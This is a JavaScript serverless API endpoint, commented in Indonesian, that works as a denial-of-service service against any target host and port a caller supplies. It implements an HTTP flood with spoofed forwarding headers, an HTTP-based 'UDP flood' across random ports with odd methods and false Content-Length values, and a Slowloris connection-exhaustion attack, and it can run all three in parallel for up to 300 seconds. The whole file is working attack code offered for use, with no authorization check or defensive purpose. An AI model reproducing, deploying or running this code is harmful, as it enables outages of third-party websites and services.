// api/ddos.js - MURNI BUAT SERANGAN DOANG, GA ADA DATABASE

// Fungsi generate random IP palsu
function randomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

// HTTP Flood attack
async function httpFlood(target, port, duration) {
  const endTime = Date.now() + (duration * 1000)
  let attackCount = 0
  
  while (Date.now() < endTime) {
    try {
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 3000)
      
      const response = await fetch(`http://${target}:${port}`, {
        method: 'GET',
        headers: {
          'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 500) + 500}.36`,
          'X-Forwarded-For': randomIP(),
          'X-Real-IP': randomIP(),
          'Cache-Control': 'no-cache',
          'Connection': 'keep-alive',
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': `http://${randomIP()}/`
        },
        signal: controller.signal
      }).catch(() => null)
      
      clearTimeout(timeoutId)
      
      if (response) {
        attackCount++
        response.body?.cancel() // Abort biar ga nunggu response
      }
      
      // Delay kecil biar ga kena rate limit
      await new Promise(resolve => setTimeout(resolve, 5))
    } catch (e) {
      // Abaikan error, terus serang
    }
  }
  
  return attackCount
}

// UDP Flood simulation (via HTTP approximation)
async function udpFlood(target, port, duration) {
  const endTime = Date.now() + (duration * 1000)
  let attackCount = 0
  const ports = [port, 53, 80, 443, 8080, 22, 21, 25, 3306, 5432, 3389, 8080, 8443]
  
  while (Date.now() < endTime) {
    try {
      // Random port biar server bingung
      const randomPort = ports[Math.floor(Math.random() * ports.length)]
      
      // Method aneh biar server bingung
      const methods = ['OPTIONS', 'TRACE', 'PATCH', 'DELETE', 'HEAD', 'PROPFIND', 'SEARCH', 'LOCK', 'UNLOCK']
      const method = methods[Math.floor(Math.random() * methods.length)]
      
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 800)
      
      await fetch(`http://${target}:${randomPort}`, {
        method: method,
        headers: {
          'Content-Length': '9999999',
          'X-Forwarded-For': randomIP(),
          'X-Real-IP': randomIP(),
          'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        },
        signal: controller.signal
      }).catch(() => {
        attackCount++
      })
      
      clearTimeout(timeoutId)
    } catch (e) {
      attackCount++
    }
  }
  
  return attackCount
}

// Slowloris attack - tahan koneksi tetap terbuka
async function slowlorisAttack(target, port, duration) {
  const endTime = Date.now() + (duration * 1000)
  let attackCount = 0
  const connections = []
  
  while (Date.now() < endTime && connections.length < 300) {
    try {
      const controller = new AbortController()
      
      // Kirim partial request biar server nunggu
      fetch(`http://${target}:${port}`, {
        method: 'POST',
        headers: {
          'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 500) + 500}.36`,
          'X-Forwarded-For': randomIP(),
          'Content-Length': '1000000',
          'Connection': 'keep-alive',
          'Keep-Alive': 'timeout=999, max=1000'
        },
        body: '--boundary\r\nContent-Disposition: form-data; name="file"\r\n\r\n' + 'A'.repeat(1000),
        signal: controller.signal
      }).catch(() => null)
      
      connections.push(controller)
      attackCount++
      
      await new Promise(resolve => setTimeout(resolve, 50))
    } catch (e) {
      // Lanjut
    }
  }
  
  return attackCount
}

// Main handler
export default async function handler(req, res) {
  // Set header
  res.setHeader('Content-Type', 'application/json')
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).json({})
  }
  
  // Cuma allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }
  
  try {
    // Parse body
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body
    const { target, port, duration, attackType } = body
    
    // Validasi
    if (!target || !port || !duration || !attackType) {
      return res.status(400).json({ error: 'Missing required fields' })
    }
    
    // Validasi durasi (max 300 detik biar ga timeout)
    const attackDuration = Math.min(parseInt(duration), 300)
    
    // Bersihin target dari http/https dan path
    let cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0]
    // Hapus port kalo ada di target
    cleanTarget = cleanTarget.split(':')[0]
    
    console.log(`[ATTACK] Starting ${attackType} attack on ${cleanTarget}:${port} for ${attackDuration}s`)
    
    // Pilih tipe serangan
    let attackCount = 0
    const startTime = Date.now()
    
    switch(attackType) {
      case 'http':
        attackCount = await httpFlood(cleanTarget, port, attackDuration)
        break
      case 'udp':
        attackCount = await udpFlood(cleanTarget, port, attackDuration)
        break
      case 'slowloris':
        attackCount = await slowlorisAttack(cleanTarget, port, attackDuration)
        break
      case 'both':
        // Jalankan paralel
        const [httpCount, udpCount, slowCount] = await Promise.all([
          httpFlood(cleanTarget, port, Math.floor(attackDuration/3)),
          udpFlood(cleanTarget, port, Math.floor(attackDuration/3)),
          slowlorisAttack(cleanTarget, port, Math.floor(attackDuration/3))
        ])
        attackCount = httpCount + udpCount + slowCount
        break
      default:
        attackCount = await httpFlood(cleanTarget, port, attackDuration)
    }
    
    const executionTime = (Date.now() - startTime) / 1000
    
    // Return hasil
    return res.status(200).json({
      success: true,
      message: `Attack ${attackType.toUpperCase()} completed!`,
      target: cleanTarget,
      port: parseInt(port),
      duration: attackDuration,
      attackType: attackType,
      attackCount: attackCount,
      executionTime: executionTime.toFixed(2),
      timestamp: new Date().toISOString()
    })
    
  } catch (error) {
    console.error('Attack error:', error)
    return res.status(500).json({ 
      error: 'Attack failed',
      details: error.message
    })
  }
}
